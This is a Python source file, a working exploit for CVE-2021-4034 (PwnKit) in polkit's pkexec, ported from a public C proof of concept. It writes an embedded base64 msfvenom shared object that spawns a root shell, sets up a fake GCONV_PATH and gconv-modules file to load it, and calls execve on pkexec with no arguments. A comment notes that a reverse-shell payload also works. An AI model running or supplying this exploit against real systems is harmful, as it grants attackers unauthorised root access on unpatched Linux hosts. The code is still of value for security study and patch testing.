#!/usr/bin/env python3

# CVE-2021-4034 in Python
#
# Joe Ammond (joe@ammond.org)
#
# This was just an experiment to see whether I could get this to work
# in Python, and to play around with ctypes

# This was completely cribbed from blasty's original C code:
# https://haxx.in/files/blasty-vs-pkexec.c

import base64
import os
import sys

from ctypes import *
from ctypes.util import find_library

# Payload, base64 encoded ELF shared object. Generate with:
#
# msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64
#
# The PrependSetuid=true is important, without it you'll just get
# a shell as the user and not root.
#
# Should work with any msfvenom payload, tested with linux/x64/exec
# and linux/x64/shell_reverse_tcp

payload_b64 = b'''
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC
AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArwEAAAAAAADMAQAAAAAAAAAQ
AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA
AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA
AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAASDH/amlYDwVIuC9iaW4vc2gAmVBUX1JeajtYDwU=
'''
payload = base64.b64decode(payload_b64)

# Set the environment for the call to execve()
environ = [
        b'exploit',
        b'PATH=GCONV_PATH=.',
        b'LC_MESSAGES=en_US.UTF-8',
        b'XAUTHORITY=../LOL',
        None
]

# Find the C library to call execve() directly, as Python helpfully doesn't
# allow us to call execve() with no arguments.
try:
    libc = CDLL(find_library('c'))
except:
    print('[!] Unable to find the C library, wtf?')
    sys.exit()

# Create the shared library from the payload
print('[+] Creating shared library for exploit code.')
try:
    with open('payload.so', 'wb') as f:
        f.write(payload)
except:
    print('[!] Failed creating payload.so.')
    sys.exit()
os.chmod('payload.so', 0o0755)

# make the GCONV_PATH directory
try:
    os.mkdir('GCONV_PATH=.')
except FileExistsError:
    print('[-] GCONV_PATH=. directory already exists, continuing.')
except:
    print('[!] Failed making GCONV_PATH=. directory.')
    sys.exit()

# Create a temp exploit file
try:
    with open('GCONV_PATH=./exploit', 'wb') as f:
        f.write(b'')
except:
    print('[!] Failed creating exploit file')
    sys.exit()
os.chmod('GCONV_PATH=./exploit', 0o0755)

# Create directory to hold gconf-modules configuration file
try:
    os.mkdir('exploit')
except FileExistsError:
    print('[-] exploit directory already exists, continuing.')
except:
    print('[!] Failed making exploit directory.')
    sys.exit()

# Create gconf config file
try:
    with open('exploit/gconv-modules', 'wb') as f:
        f.write(b'module  UTF-8//    INTERNAL    ../payload    2\n');
except:
    print('[!] Failed to create gconf-modules config file.')
    sys.exit()

# Convert the environment to an array of char*
environ_p = (c_char_p * len(environ))()
environ_p[:] = environ

print('[+] Calling execve()')
# Call execve() with NULL arguments
libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)
